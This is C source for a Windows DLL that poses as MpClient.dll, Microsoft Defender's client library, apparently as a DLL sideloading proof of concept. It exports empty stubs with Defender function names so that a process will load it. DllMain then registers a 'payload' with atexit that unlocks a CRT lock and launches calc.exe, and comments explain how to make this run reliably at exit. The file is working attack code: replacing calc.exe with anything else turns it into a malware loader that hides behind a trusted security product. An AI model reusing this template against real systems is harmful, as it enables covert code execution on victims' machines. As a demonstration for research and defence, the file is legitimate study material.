// WIN32_LEAN_AND_MEAN has already been defined (don't redefine to avoid warning)
#include <Windows.h>
#include <shellapi.h>

#define DLL
#ifdef DLL
#define API __declspec(dllexport)
#define EMPTY_IMPL {}
#else
#define API __declspec(dllimport)
#define EMPTY_IMPL
#endif

EXTERN_C API VOID MpUpdateStartEx(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpClientUtilExportFunctions(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpFreeMemory(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpManagerEnable(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpNotificationRegister(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpManagerOpen(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpHandleClose(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpManagerVersionQuery(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpCleanStart(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpThreatOpen(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpScanStart(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpScanResult(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpCleanOpen(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpThreatEnumerate(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpRemapCallistoDetections(VOID) EMPTY_IMPL;

// msvcrt.dll exports all of these functions, however, CRT header files don't define them as a "__declspec(dllimport)" so let's do so here
EXTERN_C __declspec(dllimport) void __cdecl _unlock(int);
EXTERN_C __declspec(dllimport) void __cdecl _lock(int);

// Import atexit/_onexit function (either one will work) directly from msvcrt.dll otherwise any call from a DLL to atexit/_onexit will compile down to a stub in this DLL that calls msvcrt!_dllonexit
// We don't want msvcrt!_dllonexit because it runs under loader lock (during DLL detach) and appears to be broken in MSVCRT anyway (causes a crash)
//
// If you "#include <stdlib.h>" (C or C++) then you must edit the stdlib.h header file to comment out the atexit and _onexit function declarations
// Otherwise, you will get: "error C2375: '_onexit' : redefinition; different linkage"
// Full WDK Path: C:\WinDDK\7600.16385.1\inc\crt\stdlib.h

// Trying to redefine atexit in C++ (not C) will result in this error (see build log):
//     error C2375: 'atexit' : redefinition; different linkage
//     predefined c++ types (compiler internal) : see declaration of 'atexit'
// There's no easy way around that without modifying compiler internals so for C++ use _onexit
// Apparently these predefined types for C++ are stored in c1xx.dll: https://www.geoffchappell.com/studies/msvc/language/predefined/index.htm
//     - Grepping for "atexit" in that DLL yields results
//     - Also, the aforementioned "predefined c++ types" error message string exists in that DLL
//     - Knowing this, it shouldn't be too difficult to patch "atexit" out with a hex editor if you're so inclined
//     - Full WDK path: C:\WinDDK\7600.16385.1\bin\x86\amd64\c1xx.dll
EXTERN_C __declspec(dllimport) int __cdecl atexit(void (__cdecl*)(void));

//EXTERN_C __declspec(dllimport) int __cdecl _onexit(void (__cdecl*)(void));

VOID payload(VOID) {
    // Unlock CRT critical section: msvcrt!CrtLock_Exit
    // This is necessary because ShellExecute calls atexit on a NEW THREAD
    // Doing this is 100% safe (see main project C file for details)
    _unlock(8);

    ShellExecute(NULL, L"open", L"calc.exe", NULL, NULL, SW_SHOW);

    // Ensure program doesn't terminate before ShellExecute completes (see main project C file for further explanation and the correct way way of doing this)
    Sleep(3000);

    // This is necessary to be 100% safe (see main project C file for details)
    _lock(8);
}

//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) // EXE
BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved) // DLL
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Use "_onexit" for C++
        atexit(payload);
        // The original MSVCRT has no concept of "quick exit" (no quick_exit() function) so no at_quick_exit() is necessary here
    }

    return TRUE;
}
